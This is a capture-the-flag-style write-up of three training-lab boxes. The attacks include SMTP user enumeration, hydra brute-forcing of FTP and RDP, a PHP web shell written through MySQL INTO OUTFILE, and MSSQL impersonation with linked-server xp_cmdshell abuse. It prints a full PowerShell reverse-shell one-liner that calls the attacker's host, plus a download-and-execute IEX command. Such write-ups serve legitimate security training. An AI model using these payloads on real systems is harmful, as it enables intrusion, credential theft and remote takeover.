# SKILLS ASSESSEMENT

## Attacking Common Services - Easy

{% code fullWidth="true" %}
```
21/tcp open ftp

| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US

| Not valid before: 2022-04-21T19:27:17

|_Not valid after: 2032-04-18T19:27:17

| fingerprint-strings:

| GenericLines:

| 220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered

| Command unknown, not supported or not allowed...

| Help:

| 220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered

| 214-The following commands are implemented

| USER PASS ACCT QUIT PORT RETR

| STOR DELE RNFR PWD CWD CDUP

| NOOP TYPE MODE STRU

| LIST NLST HELP FEAT UTF8 PASV

| MDTM REST PBSZ PROT OPTS CCC

| XCRC SIZE MFMT CLNT ABORT

| HELP command successful

| NULL, SMBProgNeg, SSLSessionReq:

|_ 220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered

25/tcp open smtp hMailServer smtpd

| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP

|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

443/tcp open ssl/https?

|_ssl-date: 2024-04-02T17:43:49+00:00; +8s from scanner time.

| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US

| Not valid before: 2022-04-21T19:27:17

|_Not valid after: 2032-04-18T19:27:17

587/tcp open smtp hMailServer smtpd

| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP

|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

3389/tcp open ms-wbt-server Microsoft Terminal Services

|_ssl-date: 2024-04-02T17:43:49+00:00; +10s from scanner time.

| ssl-cert: Subject: commonName=WIN-EASY

| Not valid before: 2024-04-01T17:26:40

|_Not valid after: 2024-10-01T17:26:40

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :

Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
```
{% endcode %}

So the first thing I noticed was that we could use `RCPT` and `VRFY`, but `VRFY` would not work. Therefore i opted for the second option and then i ran smtp-user-enum to enumerate users over SMTP.

{% code fullWidth="true" %}
```
./smtp-user-enum -m RCPT -u users.list inlanefreight.htb 25 -d inlanefreight.htb
Connecting to inlanefreight.htb 25 ...
220 WIN-EASY ESMTP
250 Hello.
250 OK
Start enumerating users with RCPT mode ...
[SUCC] fiona 250 OK
```
{% endcode %}

As we obtained the 'fiana' user, we proceeded to brute-force FTP using this username.

{% code fullWidth="true" %}
```
 hydra -l fiona -P /usr/share/wordlists/rockyou.txt  -t 32 10.129.14.76 ftp -vV
```
{% endcode %}

And we can also utilize the user's credentials to connect to MySQL.

{% code fullWidth="true" %}
```
mysql -h 10.129.14.76 -u fiona -p
```
{% endcode %}

If you check you will find that the user can use `outfile()`. so let's proceed to create a simple webshell and save it in the root directory of the XAMPP server.

{% code fullWidth="true" %}
```
MariaDB [(none)]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php";
```
{% endcode %}

So, if we need to verify whether that file has been created or not

{% code fullWidth="true" %}
```
MariaDB [(none)]> SELECT LOAD_FILE("C:\\xampp\\htdocs\\backdoor.php");
+----------------------------------------------+
| LOAD_FILE("C:\\xampp\\htdocs\\backdoor.php") |
+----------------------------------------------+
| <?php system($_GET['cmd']); ?>
              |
+----------------------------------------------+
1 row in set (0.051 sec)
```
{% endcode %}

Now, we can read the flag by visiting the path of our web shell but if we focus to obtain a shell on that server, let's generate a PowerShell shell.

![](https://www.hack-notes.pro/~gitbook/image?url=https%3A%2F%2F1785929618-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FAXymzcH5Nj1Px2RyBUvX%252Fuploads%252FqItxuHKzsso2H6c9HO6v%252FScreenshot%25202024-03-27%2520225100.png%3Falt%3Dmedia%26token%3Db5baf7f9-9328-408e-a9dd-3a953e4bb84a\&width=768\&dpr=4\&quality=100\&sign=68f7c352\&sv=2)

and we need to start a listener

```
rlwrap nc -lnvp 4444
```

To trigger our shell and obtain the shell, we can navigate to the path where it is located which is in the root directory

![](https://www.hack-notes.pro/~gitbook/image?url=https%3A%2F%2F1785929618-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FAXymzcH5Nj1Px2RyBUvX%252Fuploads%252FjOU0wGFbcuJ7bINxRfmW%252FPasted%2520image%252020240403113000.png%3Falt%3Dmedia%26token%3D04bbe11d-d5ae-4db9-8546-c769c6e62b7f\&width=768\&dpr=4\&quality=100\&sign=a27a0ef2\&sv=2)

getting shell

![](https://www.hack-notes.pro/~gitbook/image?url=https%3A%2F%2F1785929618-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FAXymzcH5Nj1Px2RyBUvX%252Fuploads%252FpPhssgcgJDDVnybNWebW%252FPasted%2520image%252020240403113024.png%3Falt%3Dmedia%26token%3D7d4998e6-a009-4f68-b37d-aed1b832632a\&width=768\&dpr=4\&quality=100\&sign=4f0742b\&sv=2)

get the flag

{% code fullWidth="true" %}
```
PS C:\xampp> Get-ChildItem -Path c:\ -Filter "flag.txt" -Recurse


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/22/2022  10:36 AM             39 flag.txt
```
{% endcode %}

## Attacking Common Services - Medium

{% code fullWidth="true" %}
```
sudo nmap -p- --min-rate 20000 --stats-every 50s 10.129.106.78 -sS -vvv -Pn -
Completed SYN Stealth Scan at 09:57, 27.95s elapsed (65535 total ports)
Nmap scan report for 10.129.106.78
Host is up, received user-set (7.9s latency).
Scanned at 2024-04-04 09:56:50 EDT for 28s
Not shown: 45157 filtered tcp ports (no-response), 20372 closed tcp ports (reset)
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
53/tcp    open  domain      syn-ack ttl 63
110/tcp   open  pop3        syn-ack ttl 63
995/tcp   open  pop3s       syn-ack ttl 63
2121/tcp  open  ccproxy-ftp syn-ack ttl 63
30021/tcp open  unknown     syn-ack ttl 63
```
{% endcode %}

So, when used together, `--min-rate 10000 --stats-every 50s` would instruct Nmap to scan at a minimum rate of 10,000 packets per second and provide a status update every 50 seconds. This can help make the scan faster and more efficient, especially for large scans.

Let's test the 'transfer zone' functionality on that DNS server.

{% code fullWidth="true" %}
```
dig AXFR @10.129.201.127 inlanefreight.htb

; <<>> DiG 9.19.17-2~kali1-Kali <<>> AXFR @10.129.201.127 inlanefreight.htb
; (1 server found)
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.200.5
dc1.inlanefreight.htb.  604800  IN      A       10.129.100.10
dc2.inlanefreight.htb.  604800  IN      A       10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN    A       127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN    A       10.129.200.70
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1
un.inlanefreight.htb.   604800  IN      A       10.129.200.142
ws1.inlanefreight.htb.  604800  IN      A       10.129.200.101
ws2.inlanefreight.htb.  604800  IN      A       10.129.200.102
wsus.inlanefreight.htb. 604800  IN      A       10.129.200.80
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
```
{% endcode %}

We will retrieve these subdomains, but if we perform the same action 'transfer zone' we won't find anything special so let's attempt to connect to the last FTP server using default credentials.

{% code fullWidth="true" %}
```
ftp 10.129.201.127 30021
Connected to 10.129.201.127.
220 ProFTPD Server (Internal FTP) [10.129.201.127]
Name (10.129.201.127:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||38341|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||46356|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||20176|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***********************************************************************|   153        3.09 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:04 (0.03 KiB/s)
ftp> byte
?Invalid command.
ftp> exit
421 Idle timeout (600 seconds): closing control connection
```
{% endcode %}

We obtained 'mynotes.txt' which contains passwords. We will utilize these passwords to conduct a brute-force attack on the second FTP server.

{% code fullWidth="true" %}
```
hydra -l simon -P ./mynotes.txt ftp://10.129.201.127:2121/ -vV
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-04 06:15:56
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ftp://10.129.201.127:2121/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "234987123948729384293" - 1 of 8 [child 0] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "+23358093845098" - 2 of 8 [child 1] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "ThatsMyBigDog" - 3 of 8 [child 2] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "Rock!ng#May" - 4 of 8 [child 3] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "Puuuuuh7823328" - 5 of 8 [child 4] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "8Ns8j1b!23hs4921smHzwn" - 6 of 8 [child 5] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "237oHs71ohls18H127!!9skaP" - 7 of 8 [child 6] (0/0)
[ATTEMPT] target 10.129.201.127 - login "simon" - pass "238u1xjn1923nZGSb261Bs81" - 8 of 8 [child 7] (0/0)
[STATUS] attack finished for 10.129.201.127 (waiting for children to complete tests)
[2121][ftp] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-04 06:16:18
```
{% endcode %}

And we retrieved the password 'simon' so now let's connect to the FTP server using this credential.

{% code fullWidth="true" %}
```
ftp 10.129.201.127 2121              
Connected to 10.129.201.127.
220 ProFTPD Server (InlaneFTP) [10.129.201.127]
Name (10.129.201.127:kali): simon
331 Password required for simon
Password: 
230 User simon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||57421|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
226 Transfer complete
ftp> cd Maildir
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||64846|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 simon    simon         452 Apr 18  2022 dovecot.list.index.log
-rw-rw-r--   1 simon    simon           8 Apr 18  2022 dovecot-uidvalidity
-r--r--r--   1 simon    simon           0 Apr 18  2022 dovecot-uidvalidity.625dd61f
226 Transfer complete
ftp> bye
221 Goodbye.
```
{% endcode %}

we can read the flag or connecting over ssh

```
ssh simon@10.129.201.127
The authenticity of host '10.129.201.127 (10.129.201.127)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:18: [hashed name]
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:20: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.201.127' (ED25519) to the list of known hosts.
simon@10.129.201.127's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Apr 2024 10:19:26 AM UTC

  System load:  0.15               Processes:               222
  Usage of /:   16.7% of 13.72GB   Users logged in:         0
  Memory usage: 12%                IPv4 address for ens160: 10.129.201.127
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

No mail.
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ dir
flag.txt  Maildir
```

***

## Attacking Common Services - Hard

```
rustscan -a 10.129.150.169 -r 1-65535 --ulimit 5000
```

so i used `smbclient` to retrieve any share files on the network

```
smbclient -L 10.129.203.10                                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
```

if we can access to "Home" directory

```
smbclient \\\\10.129.203.10\\Home
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

                7706623 blocks of size 4096. 3168564 blocks available
smb: \> dir .\IT\
  .                                   D        0  Thu Apr 21 16:11:44 2022
  ..                                  D        0  Thu Apr 21 16:11:44 2022
  Fiona                               D        0  Thu Apr 21 16:11:53 2022
  John                                D        0  Thu Apr 21 17:15:09 2022
  Simon                               D        0  Thu Apr 21 17:16:07 2022
```

In each directory there are files containing user credentials so download them using `get filename`. of particular interest is the 'secrets.txt' file in John's directory which suggesting that this user is running a linked server so let's use the credentials file of "Fiona" to attempt brute-forcing RDP access.

{% code fullWidth="true" %}
```
hydra -l fiona -P ./creds.txt 10.129.150.169 rdp -vV 
```
{% endcode %}

I obtained the password and now i will use it to connect to RDP using the 'rdesktop' command.

```
rdesktop -u fiona -p '48Ns72!bns74@S84NNNSl' 10.129.150.169
Autoselecting keyboard map 'en-us' from locale
```

The first step i took was to check the users on the machine as you can see, i couldn't find users 'Simon' and 'John' so we won't brute force RDP again with their credentials file. In the next step i will include the listening port in the Nmap scan.

![](https://www.hack-notes.pro/~gitbook/image?url=https%3A%2F%2F1785929618-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FAXymzcH5Nj1Px2RyBUvX%252Fuploads%252FmRJOLSqJ65kmTkJTe55Z%252FPasted%2520image%252020240404150239.png%3Falt%3Dmedia%26token%3Dc1953414-9fbf-48a9-8a04-919496f3f7c6\&width=768\&dpr=4\&quality=100\&sign=b806754c\&sv=2)

i run Nmap scan with all these ports

{% code fullWidth="true" %}
```
nmap -p135,445,1433,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49697,139 10.129.150.169 -A -Pn -vvv 
```
{% endcode %}

As we can see there is an MSSQL port available so let's use Fiona's credentials to connect to it.

{% code fullWidth="true" %}
```
sqsh -S 10.129.203.10 -U '.\\fiona' -P '48Ns72!bns74@S84NNNSl' -h
```
{% endcode %}

It worked so can we use other user credentials to brute-force MSSQL? i attempted to brute-force other users using `Medusa`.

```
medusa -h 192.168.1.128 –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
```

And it did not work so let's return to our session in MSSQL and If you recall we found a file named 'information.txt' under John's directory that contained 'create a local linked server'. Let's check if there are any linked servers.

{% code fullWidth="true" %}
```
1> SELECT srvname, isremote FROM sysservers
2> go
```
{% endcode %}

So the 'LOCAL.TEST.LINKED.SRV' is a linked server and let's see if attempting to run a query remotely will work however, considering the 'impersonation' mentioned in the previous file, let's check which users we can impersonate.

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> go

        john                                                                       

        simon                                                                        
```

Impersonating john user

```
1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go
```

It worked. Now let's verify if John is a sysadmin on that linked server.

{% code fullWidth="true" %}
```
1> select * from openquery("LOCAL.TEST.LINKED.SRV", 'SELECT is_srvrolemember(''sysadmin'')')
```
{% endcode %}

It displayed a '1' value indicating that the John user has the 'sysadmin' role. Now let's execute SQL queries on that linked server.

{% code fullWidth="true" %}
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
2> go
```
{% endcode %}

and now i executed "whoami" using "xp\_cmdshell"

{% code fullWidth="true" %}
```
1> EXECUTE('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
2> go
```
{% endcode %}

so we need to enable first "xp\_cmdshell" to be able to use it and execute `whoami` again

{% code fullWidth="true" %}
```
1> EXECUTE('
2>  EXEC sp_configure ''show advanced options'', 1;
3>  RECONFIGURE;
4>  EXEC sp_configure ''xp_cmdshell'', 1;
5>  RECONFIGURE;
6>  EXEC xp_cmdshell ''whoami''
7> ') AT [LOCAL.TEST.LINKED.SRV];
8> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

        nt authority\system                                                        
                                                
```
{% endcode %}

so we can execute cmd command you can use `loadfile()` to read the flag but in our case we will get a shell so let's generate one with powershell and save it in "shell.ps1"

{% code fullWidth="true" %}
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.165',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

i placed it in the same directory where we will run our Python server.

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.203.10 - - [05/Apr/2024 06:54:11] "GET /shell.ps1 HTTP/1.1" 200 -
10.129.203.10 - - [05/Apr/2024 06:55:52] "GET /shell.ps1 HTTP/1.1" 200 -
```

And ran Netcat on the same port for the PowerShell reverse shell.

```
nc -lnvp 4444
```

And executed the command to download our PowerShell reverse shell and execute it directly into memory

{% code fullWidth="true" %}
```
1> EXECUTE('xp_cmdshell ''echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.16.165/shell.ps1") | powershell -noprofile''') AT [LOCAL.TEST.LINKED.SRV];
2> go
```
{% endcode %}

And as you can see, you will get a shell on that machine

![](https://www.hack-notes.pro/~gitbook/image?url=https%3A%2F%2F1785929618-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FAXymzcH5Nj1Px2RyBUvX%252Fuploads%252Fw1VS5xvciUEmiYPoAiPV%252FPasted%2520image%252020240405122921.png%3Falt%3Dmedia%26token%3De15c90a8-6679-4401-a36c-e7033fb856dc\&width=768\&dpr=4\&quality=100\&sign=12ece3ba\&sv=2)

I hope you enjoyed the process! Here are some references for furt
